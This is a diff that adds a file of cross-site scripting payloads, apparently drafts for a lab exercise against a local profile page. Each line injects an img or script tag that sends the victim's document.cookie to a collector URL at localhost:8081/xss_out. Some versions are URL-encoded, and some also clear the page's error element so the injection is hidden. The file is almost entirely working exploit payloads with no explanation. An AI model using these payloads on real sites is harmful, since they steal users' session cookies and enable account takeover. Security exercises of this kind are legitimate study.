@@ -1,0 +1,31 @@
+<!-- <img src=x onerror="this.src='http://localhost:8081/xss_out?stolen_cookie='+document.cookie; this.removeAttribute('onerror');"> -->
+http://localhost:8080/profile/victim/<img src="http://localhost:8081/xss_out?stolen_cookie="+document.cookie/>
+
+
+
+http://localhost:8080/profile/victim/<img src="'http%3A%2F%2Flocalhost%3A8081%2Fxss_out%3Fstolen_cookie%3D'+document.cookie;"/>
+<!-- http://localhost:8080/profile/<img src=x onerror=alert(document.cookie)> -->
+
+
+http://localhost:8080/profile/<img src="http://localhost:8081/xss_out" onload="var i=0;if(i++)this.src+='?stolen_cookie='+encodeURIComponent(document.cookie);"/>
+http://localhost:8080/profile/<img src="http://localhost:8081/xss_out"?stolen_cookie='+encodeURIComponent(document.cookie)  />
+
+<!-- http://localhost:8080/profile/%3Cimg%20src='http://localhost:8081/xss_out?stolen_cookie=%27+document.cookie;%3E -->
+
+
+http://localhost:8080/profile/victim/<img src=x onerror="this.src='http://localhost:8081/xss_out?stolen_cookie='+document.cookie; this.removeAttribute('onerror');">
+
+
+http://localhost:8080/profile/<img src='http%3A%2F%2Flocalhost%3A8081%2Fxss_out%3Fstolen_cookie%3D'+document.cookie;/>
+http://localhost:8080/profile/<img src='http%3A%2F%2Flocalhost%3A8081%2Fxss_out%3Fstolen_cookie%3D'+document.cookie;/>
+
+
+http://localhost:8080/profile/
+<script>
+    document.write('<img src="http://localhost:8081/xss_out?stolen_cookie='+document.cookie+'"/>');
+    document.getElementsByClassName('error')[0].innerHTML='';
+</script>
+
+
+http://localhost:8080/profile/
+<script>document.write('<img src="http://localhost:8081/xss_out?stolen_cookie='+document.cookie+'"/>');document.getElementsByClassName('error')[0].innerHTML='';</script>
